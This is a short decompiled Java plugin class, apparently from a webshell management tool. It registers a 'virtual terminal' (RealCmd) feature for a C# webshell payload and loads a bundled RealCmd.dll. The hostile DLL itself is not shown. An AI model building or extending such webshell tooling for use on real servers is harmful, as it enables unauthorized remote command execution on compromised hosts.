/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.RealCmd;
import util.functions;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="RealCmd", DisplayName="\u865a\u62df\u7ec8\u7aef")
public class CRealCmd
extends RealCmd {
    private static final String CLASS_NAME = "RealCmd.Run";

    @Override
    public byte[] readPlugin() {
        return functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("assets/RealCmd.dll"));
    }

    @Override
    public String getClassName() {
        return CLASS_NAME;
    }
}

